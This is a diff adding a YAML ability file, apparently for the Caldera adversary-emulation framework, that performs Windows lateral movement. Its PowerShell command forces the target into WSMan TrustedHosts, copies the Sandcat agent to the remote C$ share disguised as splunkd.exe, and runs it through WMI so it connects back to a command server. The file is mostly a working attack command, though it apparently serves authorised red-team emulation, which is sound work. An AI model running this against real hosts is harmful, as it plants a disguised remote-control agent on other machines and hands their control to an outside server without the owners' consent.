@@ -1,0 +1,20 @@
+---
+- id: f042b784-2f56-46a4-bd60-b62e0f01d9fd
+  name: Sandcat Lateral Movement
+  description: |
+    Uses Copy-Item and Invoke-Command to copy and run Sandcat.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.006
+    name: "Remote Services: Windows Remote Management"
+  repeatable: true
+  delete_payload: true
+  platforms:
+    windows:
+      psh:
+        command: |-
+          Set-Item WSMan:\localhost\Client\TrustedHosts "#{remote.host.name}" -Force;
+          Copy-Item -Path "#{sandcat.payload.location}" -Destination "\\#{remote.host.name}\C$\Users\Public\splunkd.exe";
+          Invoke-Command -ScriptBlock {
+            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "C:\Users\Public\splunkd.exe -server #{caldera.url} -group red";
+          } -ComputerName "#{remote.host.name}";
